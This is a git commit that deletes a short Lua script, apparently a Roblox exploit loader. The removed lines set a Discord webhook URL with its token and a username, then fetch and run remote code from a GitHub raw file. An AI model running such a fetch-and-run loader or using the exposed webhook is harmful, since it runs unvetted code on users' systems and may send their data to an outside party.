102d7225dca976ab3885c048f97774bfd9a926da
Jhon Mark Tanguan <118828971+MarkTzyyyy@users.noreply.github.com>
2025-08-10 10:33:07 +0800

    Delete Script.lua

--- Script.lua
+++
@@ -1,3 +0,0 @@
-getgenv().Webhook = "https://discord.com/api/webhooks/1403561060417667254/l8mKxcgLJHoFwC7dv8t-tZIF2-3wb0oMduudVELMQ6o0EbFYL4vVl_IrWOA12FT80GZE"
-getgenv().Username = "Gato_panson253"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MarkTzyyyy/Speed-hub-xx/refs/heads/main/Speed20%25Hub20X%25"))()
